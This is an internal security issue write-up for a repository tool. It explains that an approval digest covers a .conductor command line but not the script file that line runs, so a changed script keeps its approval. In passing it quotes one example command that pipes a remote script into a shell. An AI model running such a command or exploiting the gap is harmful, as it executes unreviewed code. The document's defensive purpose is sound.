# A `.conductor` command line is digested, but the file it runs is not

**Found:** 2026-09-02, split off from
`a-hook-outside-the-hooks-directory-is-approved-unread.md` when that one landed.
It is the same shape in a different module and did not close with it.

## What happens

`scriptsDigest` (`src/core/repoSource.ts:183-194`) digests `script.contents`.
Where the repository supplies a script as a file — `.octopus/scripts/dev` — the
contents _are_ what runs, and the digest is exact.

Where it supplies one as a **command line** in `.conductor/settings.toml`, the
contents are the line, and what actually runs is whatever that line invokes:
`./scripts/boot.sh` is four characters of digest over a file the digest never
touches. A `git pull` rewriting `scripts/boot.sh` while the TOML stays
byte-identical produces the identical digest, the Run button stays approved, and
the changed shell runs.

## Why it matters

`SECURITY.md` holds `repoSource.ts` to the same bar as `repoTrust.ts` — "an
approval that survives the script changing … is as serious as the item above".
This is that case, in the module the sentence is about.

`repoTrust.ts` settled the rule for hooks: do not try to resolve a path out of a
shell line, because `curl evil.sh | sh` names no file; digest the directory
whole instead and narrow the promise to what the code can keep. There is no
directory to read whole here, so the answer has to be a different one — either
the card says plainly that a command line is digested and its target is not, or
`.conductor` command lines stop being trusted on a digest at all.

## Evidence

- `src/core/repoSource.ts:183-194` — `scriptsDigest`, digesting `contents`.
- `src/core/repoTrust.ts` — the sibling, and the rule this one has to answer to.
- `SECURITY.md` — the second bullet, which names this exact failure.
